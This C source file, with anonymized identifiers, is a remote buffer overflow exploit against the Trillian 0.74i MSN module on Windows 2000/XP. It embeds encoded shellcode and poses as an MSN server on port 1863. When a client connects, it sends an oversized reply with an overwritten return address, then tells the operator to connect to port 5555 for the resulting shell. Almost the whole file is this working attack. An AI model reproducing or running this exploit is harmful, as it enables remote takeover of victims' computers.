
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int mess ;
typedef int WSADATA ;
typedef int WORD ;
typedef scalar_t__ SOCKET ;


 int VAR_0 ;
 int FUNC_0 (int,int ) ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_1 () ;
 int FUNC_2 (int ,int *) ;
 scalar_t__ FUNC_3 (scalar_t__,struct sockaddr*,int*) ;
 int FUNC_4 (scalar_t__,struct sockaddr*,int) ;
 int FUNC_5 (scalar_t__) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int) ;
 int FUNC_8 (scalar_t__,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (scalar_t__,char*,int,int ) ;
 int FUNC_11 (scalar_t__,char*,int,int ) ;
 scalar_t__ FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*,char*) ;
 int FUNC_14 (char*) ;

int FUNC_15(int VAR_3,char **VAR_4){

 char VAR_5[] =
 "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA\xEB"
 "\x05\xE8\xEB\xFF\xFF\xFF\x70\x99\x98\x99\x99\xC3\xFD\x12\xD8\xA9\x12"
 "\xD9\x95\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12"
 "\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8"
 "\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E"
 "\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
 "\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
 "\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71\xE5"
 "\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9D\xC0"
 "\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x69\x12"
 "\x41\x5E\x9E\x9B\x99\x8C\x2A\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66"
 "\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66\xCE\x65\x1A\x75\xDD"
 "\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B\x62\x10\xDF\xA1\x10\xDF"
 "\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99\x99\x14\xDE\x89\xC9\xCF\xCA"
 "\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9"
 "\xCA\x66\xCE\x7D\xC9\x66\xCE\x71\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB"
 "\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66"
 "\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB"
 "\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED"
 "\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8"
 "\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA"
 "\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99"
 "\xF8\xFA\xFA\xFC\xE9\xED\x99";


 SOCKET VAR_6, VAR_7;
 struct sockaddr_in VAR_8, VAR_9;
 WSADATA VAR_10;
 WORD VAR_11;
 char VAR_12[4096];
 int VAR_13, VAR_14, VAR_15;

 VAR_11 = FUNC_0(2, 0);
 FUNC_2(VAR_11, &VAR_10);

 FUNC_9("------------------------------------------------------------------------\r\n");
 FUNC_9("-  Cerulean Studios Trillian 0.74i MSN module Buffer Overflow exploit  -\r\n");
 FUNC_9("-                   for Windows 2000 / Windows XP                      -\r\n");
 FUNC_9("-                                                                      -\r\n");
 FUNC_9("-         created by Komrade  -  http://unsecure.altervista.org        -\r\n");
 FUNC_9("------------------------------------------------------------------------\r\n");

 VAR_6 = FUNC_12(VAR_1,VAR_2, 0);
 VAR_8.sin_family = VAR_1;
 VAR_8.sin_port = FUNC_7(1863);
 VAR_8.sin_addr.s_addr = VAR_0;

 FUNC_4(VAR_6, (struct sockaddr*)&VAR_8, sizeof(struct sockaddr_in));
 FUNC_8(VAR_6,1);

 VAR_13 = sizeof (struct sockaddr);

 FUNC_9("\r\nWaiting for a connection...\r\n");

 VAR_7 = FUNC_3(VAR_6, (struct sockaddr*)&VAR_9, &VAR_13);
 if (VAR_7 <= 0){
  FUNC_9("Unable to wait for connections\r\n");
  FUNC_6(-1);
 }

 VAR_14=FUNC_10(VAR_7, VAR_12, sizeof(VAR_12),0);
 if (VAR_14 < 0){
  FUNC_9("Error receving connections\r\n");
  FUNC_6(-1);
 }

 FUNC_9("Received a connection request from a client.\r\n");

 FUNC_13(VAR_12, VAR_5);

 for(VAR_15=FUNC_14(VAR_5); VAR_15 < 4090; VAR_15++)
  VAR_12[VAR_15]='x';

 VAR_12[VAR_15]=0x33;
 VAR_12[VAR_15+1]=0x12;
 VAR_12[VAR_15+2]=0x40;
 VAR_12[VAR_15+3]='\r';
 VAR_12[VAR_15+4]='\n';
 VAR_12[VAR_15+5]='\0';

 VAR_14 = FUNC_11(VAR_7, VAR_12, FUNC_14(VAR_12),0);
 if (VAR_14 > 0){
  FUNC_9("Exploit sent succesfully.\r\n");
  FUNC_9("Now connect to port 5555.\r\n");
 }
 else
  FUNC_9("Error sending the exploit\r\n");

 FUNC_5 (VAR_7);
 FUNC_5(VAR_6);
 FUNC_1();
 return 0;
}
